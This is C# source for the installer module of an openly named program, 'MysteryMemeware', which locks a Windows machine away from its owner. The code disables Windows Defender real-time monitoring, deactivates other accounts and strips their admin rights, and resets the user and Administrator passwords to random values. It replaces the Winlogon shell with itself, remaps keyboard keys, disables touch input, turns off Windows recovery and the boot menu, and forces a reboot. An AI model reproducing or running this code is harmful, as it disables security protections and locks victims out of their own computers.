using MysteryHelper;
namespace MysteryInstaller
{
	public static class RegistryInforcementModule
	{
		private static readonly string InstallLocation = PathHelper.RootDrive + "MysteryMemeware\\MysteryMemeware.exe";
		public static readonly string UserPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\UserPassword";
		public static readonly string AdminPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AdminPassword";
		public static readonly string IsInstalledRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\IsInstalled";
		public static void Install()
		{
			System.Console.ForegroundColor = System.ConsoleColor.White;
			System.Console.WriteLine("Installing MysteryMemeware...");
			try
			{
				InstallSubMethod();
			}
			catch (System.Exception exception)
			{
				System.Console.WriteLine();
				System.Console.ForegroundColor = System.ConsoleColor.DarkYellow;
				System.Console.WriteLine("ERROR: " + exception.Message);
			}
		}
		private static void InstallSubMethod()
		{
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableRealtimeMonitoring", 1, RegistryType.DWORD);
			if (System.IO.Directory.Exists(System.IO.Path.GetDirectoryName(InstallLocation)))
			{
				System.IO.Directory.Delete(System.IO.Path.GetDirectoryName(InstallLocation));
			}
			System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(InstallLocation));
			System.IO.File.Copy("MysteryMemeware.exe", InstallLocation);
			foreach (string username in UserHelper.GetLocalUsernames())
			{
				try
				{
					if (!StringHelper.MatchesCaseless(username, UserHelper.CurrentUsername))
					{
						UserHelper.DeactivateUser(username);
					}
				}
				catch
				{
				}
				try
				{
					UserHelper.RemoveAdmin(username);
				}
				catch
				{
				}
			}
			UserHelper.ActivateUser("Administrator");
			string newUserPassword = UserHelper.GeneratePassword();
			RegistryHelper.CreateAndSetValue(UserPasswordRegistryPath, newUserPassword, RegistryType.SZ);
			UserHelper.ChangeUserPassword(UserHelper.CurrentUsername, newUserPassword);
			string newAdminPassword = UserHelper.GeneratePassword();
			RegistryHelper.CreateAndSetValue(AdminPasswordRegistryPath, newAdminPassword, RegistryType.SZ);
			UserHelper.ChangeUserPassword("Administrator", newAdminPassword);

			byte[] scancodeMap = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map", scancodeMap, RegistryType.BINARY);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience", 1, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", InstallLocation, RegistryType.SZ);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName", UserHelper.CurrentUsername, RegistryType.SZ);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword", newUserPassword, RegistryType.SZ);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon", 1, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled", 0, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate", 0, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions", 1, RegistryType.DWORD);

			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map", scancodeMap, RegistryType.BINARY);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience", 1, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", InstallLocation, RegistryType.SZ);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName", UserHelper.CurrentUsername, RegistryType.SZ);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword", newUserPassword, RegistryType.SZ);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon", 1, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled", 0, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate", 0, RegistryType.DWORD);
			RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions", 1, RegistryType.DWORD);

			RegistryHelper.CreateAndSetValue(IsInstalledRegistryPath, "true", RegistryType.SZ);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\ReAgentc.exe", "/disable"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {current} bootstatuspolicy ignoreallfailures"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {current} recoveryenabled No"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {default} recoveryenabled No"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {bootmgr} displaybootmenu No"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {globalsettings} advancedoptions false"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard"), true);
			ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\shutdown.exe", "/r /f /t 0"), false);
		}
	}
}